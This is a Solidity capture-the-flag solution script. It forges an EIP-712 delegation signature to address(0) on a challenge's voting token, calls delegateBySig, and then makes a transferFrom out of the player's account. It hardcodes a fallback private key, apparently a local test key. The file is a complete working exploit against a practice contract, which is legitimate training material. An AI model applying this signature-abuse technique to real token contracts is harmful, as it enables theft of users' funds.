// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-ctf/CTFSolver.sol";

import "src/Challenge.sol";

contract Solution is CTFSolver {
    function solve(address _challenge, address _player) internal virtual override {
        Challenge challenge = Challenge(_challenge);
        uint256 playerPK = vm.envOr("PLAYER", uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80));

        bytes32 domainSeparator =
            keccak256(abi.encode(challenge.votingToken().DOMAIN_TYPEHASH(), keccak256(bytes(challenge.votingToken().name())), 31337, address(challenge.votingToken())));
        bytes32 structHash = keccak256(abi.encode(challenge.votingToken().DELEGATION_TYPEHASH(), address(0), 0, 1e18));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPK, digest);
        
        challenge.votingToken().delegateBySig(address(0), 0, 1e18, v, r, s);

        challenge.votingToken().transferFrom(_player, address(101), 123);
    }
}
